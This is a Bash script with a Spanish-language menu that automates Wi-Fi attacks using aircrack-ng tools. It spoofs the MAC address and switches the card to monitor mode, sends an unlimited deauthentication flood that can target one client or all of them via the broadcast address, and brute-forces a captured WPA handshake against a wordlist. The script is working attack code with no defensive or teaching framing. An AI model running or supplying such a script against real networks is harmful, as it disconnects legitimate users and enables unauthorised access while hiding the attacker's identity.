#!/bin/bash

sudo apt install figlet

# Menú
while true; do
    clear
    figlet "FrankoSav"
    echo "Elegí una opción:"
    echo "1. Falsificar MAC y encender modo monitor"
    echo "2. Quitar el modo monitor"
    echo "3. Hacer un Deauth"
    echo "4. Hacer un escaneo"
    echo "5. Crackear handshake"
    echo "6. Salir"
    read -p "Opcion: " opcion
    
    case $opcion in
        1)
            # Mon mode on and changed mac
            ifconfig wlan0 down
            iwconfig wlan0 mode monitor
            airmon-ng check kill
            macchanger -br wlan0
            ifconfig wlan0 up
            
            read -p "Enter para volver al menú"
        ;;
        2)
            # Mon mode off
            ifconfig wlan0 down
            iwconfig wlan0 mode managed
            ifconfig wlan0 up
            /etc/init.d/networking restart
            read -p "Enter para volver al menú"
        ;;
        3)
            # Get Handshake
            read -p "MAC del ACCES POINT objetivo: " mac_ap
            read -p "MAC del cliente objetivo o FF:FF:FF:FF:FF:FF para atacar todos: " mac_cliente
            aireplay-ng --deauth 0 -a $mac_ap -c $mac_cliente wlan0
            read -p "Enter para volver al menú"
        ;;
        4)
            # Scan with interface
            iwlist wlan0 scan | grep ESSID
            read -p "Enter para volver al menú"
        ;;
        5)
            # Enter handshake file
            read -p "Ingresa la ruta del archivo handshake: " handshake_file
            
            # Enter wordlist for bruteforce
            read -p "Ingresa la ruta del diccionario a usar: " wordlist_file
            
            # Cracking Handshake
            aircrack-ng $handshake_file -w $wordlist_file
            
            read -p "Enter para volver al menú"
        ;;
        6)
            # Exit
            break
        ;;
    esac
done

